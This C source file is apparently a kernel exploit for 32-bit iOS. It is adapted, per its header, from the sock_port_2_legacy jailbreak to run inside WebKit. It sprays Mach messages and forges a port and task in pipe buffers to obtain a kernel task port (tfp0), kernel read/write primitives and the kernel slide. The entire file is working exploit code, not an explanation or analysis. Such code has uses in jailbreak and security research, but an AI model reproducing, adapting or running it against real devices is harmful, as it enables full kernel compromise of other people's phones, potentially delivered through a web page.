#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <mach/mach.h>

#include "common.h"
#include "io.h"
#include "offsets.h"
#include "memory.h"
#include "exploit.h"

/*
    modifed version of sock_port_legacy2 to run within a webkit environment
    original exploit made by kok3shidoll, TheRealClarity, et. al
    original sock_port2 by jakeajames
    socket bug by nedwill

    https://github.com/kok3shidoll/sock_port_2_legacy
*/

static inline uint32_t mach_port_waitq_flags(void) {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type = WQT_QUEUE;
    waitq_flags.waitq_fifo = 1;
    waitq_flags.waitq_prepost = 0;
    waitq_flags.waitq_irq = 0;
    waitq_flags.waitq_isvalid = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

kinfo_t *run_exploit(void) {
    init_device_offsets();
    int overwrite_pipe[2] = {-1, -1};
    int fake_port_pipe[2] = {-1, -1};

    mach_port_t target_task_port = create_mach_port();
    if (!MACH_PORT_VALID(target_task_port)) goto done;

    uint32_t self_port_addr = find_port_early(mach_task_self());
    if (self_port_addr == 0) goto done;

    uint32_t tfp0_port_addr = find_port_early(target_task_port);
    if (tfp0_port_addr == 0) goto done;

    uint32_t ipc_space_kernel = rk32_early(self_port_addr + koffsetof(ipc_port, ip_receiver));
    if (ipc_space_kernel == 0) goto done;

    pipe(overwrite_pipe);
    size_t pipebuf_size = 0x8000;
    size_t pipebuf_sizep = 0x10000;
    uint8_t *pipebuf = calloc(1, pipebuf_size);
    *(uint32_t *)(pipebuf) = pipebuf_sizep;

    write(overwrite_pipe[1], pipebuf, pipebuf_size);
    read(overwrite_pipe[0], pipebuf, pipebuf_size);
    write(overwrite_pipe[1], pipebuf, sizeof(uint32_t));

    pipe(fake_port_pipe);
    size_t fake_task_size = sizeof(ktask_t);
    size_t fake_port_size = sizeof(kport_t);
    kport_t *fake_port = calloc(1, fake_port_size + fake_task_size);
    ktask_t *fake_task = (ktask_t *)((uint32_t)fake_port + fake_port_size);
    if (fake_port == NULL) goto done;

    fake_task->ref_count = 0xff;
    fake_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fake_port->ip_references = 0xf00d;
    fake_port->ip_lock.type = 0x11;
    fake_port->ip_messages.port.receiver_name = 1;
    fake_port->ip_messages.port.msgcount = 0;
    fake_port->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fake_port->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fake_port->ip_srights = 99;
    fake_port->ip_kobject = 0;
    fake_port->ip_receiver = ipc_space_kernel;

    write(fake_port_pipe[1], (void *)fake_port, fake_port_size + fake_task_size);
    read(fake_port_pipe[0], (void *)fake_port, fake_port_size + fake_task_size);

    uint32_t self_task_addr = rk32_early(self_port_addr + koffsetof(ipc_port, ip_kobject));
    uint32_t self_proc_addr = rk32_early(self_task_addr + koffsetof(task, bsd_info));
    uint32_t proc_fds = rk32_early(self_proc_addr + koffsetof(proc, p_fd));
    uint32_t desc_ofiles = rk32_early(proc_fds + koffsetof(file_desc, fd_ofiles));
    uint32_t file_proc = rk32_early(desc_ofiles + overwrite_pipe[0] * 0x4);
    uint32_t file_glob = rk32_early(file_proc + koffsetof(file_proc, f_fglob));
    uint32_t fg_data = rk32_early(file_glob + koffsetof(file_glob, fg_data));
    uint32_t pipe_buffer = rk32_early(fg_data + koffsetof(pipe, buffer));
    if (pipe_buffer == 0) goto done;

    uint32_t port_file_proc = rk32_early(desc_ofiles + fake_port_pipe[0] * 0x4);
    uint32_t port_file_glob = rk32_early(port_file_proc + koffsetof(file_proc, f_fglob));
    uint32_t port_fg_data = rk32_early(port_file_glob + koffsetof(file_glob, fg_data));
    uint32_t port_pipe_buffer = rk32_early(port_fg_data + koffsetof(pipe, buffer));
    if (port_pipe_buffer == 0) goto done;

    fake_port->ip_kobject = port_pipe_buffer + fake_port_size;
    write(fake_port_pipe[1], (void *)fake_port, fake_port_size + fake_task_size);
    bool pipe_free = false;

    for (int i = 0; i < 50; i++) {
        if (read20_primitive(pipe_buffer, true, NULL) == 0) {
            pipe_free = true;
            break;
        }
    }

    if (!pipe_free) goto done;
    mach_port_t holder = MACH_PORT_NULL;
    uint32_t read_addr = 0;

    for (int i = 0; i < 1000; i++) {
        holder = ool_msg_spray(target_task_port, pipebuf_sizep/0x4);
        if (!MACH_PORT_VALID(holder)) goto done;

        read(overwrite_pipe[0], &read_addr, 0x4);
        if (read_addr == tfp0_port_addr) break;
        
        write(overwrite_pipe[1], &read_addr, 0x4);
        mach_port_destroy(mach_task_self(), holder);
        holder = MACH_PORT_NULL;
    }

    if (read_addr != tfp0_port_addr || !MACH_PORT_VALID(holder)) goto done;
    write(overwrite_pipe[1], &port_pipe_buffer, 0x4);
    struct ool_msg *msg = calloc(1, 0x1000);
    if (msg == NULL) goto done;

    if (mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, holder, 0, 0) != 0) {
        free(msg);
        goto done;
    }

    mach_port_t *received_ports = msg->ool_ports.address;
    mach_port_t pipe_fake_task_port = received_ports[0];
    uint32_t *port_read_addr = (uint32_t *)((uint32_t)fake_task + koffsetof(task, bsd_info));
    free(msg);

    uint32_t read_via_port_check = 0;
    rk32_via_port(self_port_addr + koffsetof(ipc_port, ip_kobject), read_via_port_check);
    if (read_via_port_check != self_task_addr) goto done;

    pid_t current_pid = 0;
    uint32_t current_proc = 0;
    uint32_t current_task = self_task_addr;
    uint32_t kernel_task_addr = 0;
    uint32_t kernel_vm_map = 0;
    uint32_t kernel_proc_addr = 0;

    while (current_task != 0) {
        rk32_via_port(current_task + koffsetof(task, bsd_info), current_proc);
        if (current_proc == 0) goto done;

        rk32_via_port(current_proc + koffsetof(proc, pid), current_pid);
        if (current_pid == 0) {
            rk32_via_port(current_task + koffsetof(task, vm_map), kernel_vm_map);
            if (kernel_vm_map == 0) goto done;
            kernel_task_addr = current_task;
            kernel_proc_addr = current_proc;
            break;
        }
        rk32_via_port(current_task + koffsetof(task, prev), current_task);
    }

    if (kernel_task_addr == 0 || kernel_vm_map == 0) goto done;
    read(fake_port_pipe[0], (void *)fake_port, fake_port_size + fake_task_size);

    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    *(uint32_t *)((uint32_t)fake_task + koffsetof(task, vm_map)) = kernel_vm_map;
    *(uint32_t *)((uint32_t)fake_task + koffsetof(task, itk_self)) = 1;

    write(fake_port_pipe[1], (void *)fake_port, fake_port_size + fake_task_size);
    init_memory(pipe_fake_task_port);
    mach_port_t target_port = create_mach_port();
    if (!MACH_PORT_VALID(target_port)) goto done;

    uint32_t target_port_addr = find_port(target_port, self_task_addr);
    uint32_t final_fake_task = kalloc(fake_task_size);
    if (final_fake_task == 0) goto done;

    kread(kernel_task_addr, fake_task, fake_task_size);
    kwrite(final_fake_task, fake_task, fake_task_size);
    fake_port->ip_kobject = final_fake_task;
    kwrite(target_port_addr, (void *)fake_port, fake_port_size);

    mach_port_t final_tfp0 = MACH_PORT_NULL;
    int kr = task_get_special_port(target_port, 1, &final_tfp0);
    if (kr != 0 || !MACH_PORT_VALID(final_tfp0)) goto done;
    init_memory(final_tfp0);

    deinit_port(pipe_fake_task_port, self_task_addr);
    wk32(fg_data + koffsetof(pipe, buffer), 0);
    deinit_port(target_port, self_task_addr);

    if (overwrite_pipe[0] > 0) close(overwrite_pipe[0]);
    if (overwrite_pipe[1] > 0) close(overwrite_pipe[1]);
    if (fake_port_pipe[0] > 0) close(fake_port_pipe[0]);
    if (fake_port_pipe[1] > 0) close(fake_port_pipe[1]);
    if (fake_port != NULL) free((void *)fake_port);

    uint32_t anchor = 0;
    if (io_leak_anchor(&anchor) != 0) goto done;
    kfree(final_fake_task, fake_task_size);
    kinfo_t *kinfo = calloc(1, sizeof(kinfo_t));

    kinfo->kernel_text_base = (anchor & 0xfff00000) + 0x1000;
    kinfo->kernel_base = kinfo->kernel_text_base - 0x100000;
    kinfo->kernel_slide = kinfo->kernel_base - 0x80001000;
    kinfo->tfp0 = final_tfp0;
    kinfo->self_port_addr = self_port_addr;
    kinfo->self_task_addr = self_task_addr;
    kinfo->self_proc_addr = self_proc_addr;
    kinfo->kern_task_addr = kernel_task_addr;
    kinfo->kern_proc_addr = kernel_proc_addr;
    kinfo->kern_vm_map = kernel_vm_map;
    return kinfo;

done:
    if (overwrite_pipe[0] > 0) close(overwrite_pipe[0]);
    if (overwrite_pipe[1] > 0) close(overwrite_pipe[1]);
    if (fake_port_pipe[0] > 0) close(fake_port_pipe[0]);
    if (fake_port_pipe[1] > 0) close(fake_port_pipe[1]);
    if (fake_port) free((void *)fake_port);
    return NULL;
}

void deinit_exploit(kinfo_t *kinfo) {
    if (offsets != NULL) free(offsets);
    if (kinfo != NULL) {
        if (MACH_PORT_VALID(kinfo->tfp0)) {
            mach_port_destroy(mach_task_self(), kinfo->tfp0);
        }
        free(kinfo);
    }
}